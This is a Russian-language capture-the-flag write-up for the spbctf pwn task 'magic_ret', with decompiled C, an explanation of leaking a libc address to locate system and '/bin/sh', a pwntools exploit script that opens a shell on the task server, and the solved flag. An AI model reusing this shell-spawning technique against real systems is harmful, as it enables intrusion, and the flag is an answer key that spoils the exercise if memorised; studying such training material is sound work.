[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn3_magic_ret)
Описание:
Всё в твоих руках, верь мне.
`nc 109.233.56.90 11633`
**[magic_ret.elf](https://pwn.spbctf.ru/files/aslr/magic_ret/magic_ret.elf)**

Программа печатает адрес libc. Необходимо найти версию данной libc на [libc database search](https://libc.blukat.me/) и передать значения адреса функции и строки `bin/sh` в терминал
``` c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  char *s1;
  int (**v4)(const char *);
  const void *retaddr;

  printf("__libc_start_main_ret: %p\n", retaddr);
  printf("&system (as hex) = ");
  v4 = (int (**)(const char *))user_input();
  if ( v4 != &system )
    raise(11);
  printf("&'/bin/sh' (as hex) = ");
  s1 = (char *)user_input();
  if ( strncmp(s1, "/bin/sh", 7u) )
    raise(11);
  puts("Let's try...");
  ((void (__fastcall *)(char *))v4)(s1);
  exit(0);
}
```

Адрес libc:
![{0EC9A520-D534-4665-AEAD-A52360B22A5B}](../../../../z.%20Images/{0EC9A520-D534-4665-AEAD-A52360B22A5B}.png)

Нашлось несколько версий, необходимо перебрать все.
![{D5B26F49-BB4C-43B2-9546-96F0155912F2}](../../../../z.%20Images/{D5B26F49-BB4C-43B2-9546-96F0155912F2}.png)

Эксплоит:
``` python
main_ret = 0x0270b3
system = 0x55410
str_bin_sh = 0x1b75aa

io = start()

io.recvuntil(b': ')
libc_base = int(io.recvline().decode(), 16)
libc_base -= main_ret

payload1 = str(hex(libc_base + system)).encode()
io.sendlineafter(b'= ', payload1)

payload2 = str(hex(libc_base + str_bin_sh)).encode()
io.sendlineafter(b'= ', payload2)

io.interactive()
```

Запуск:
![{6B9AAB02-C23A-4C57-9A12-67D27857C321}](../../../../z.%20Images/{6B9AAB02-C23A-4C57-9A12-67D27857C321}.png)

Ответ: `spbctf{fd524db64260874db5302d7607694b08}`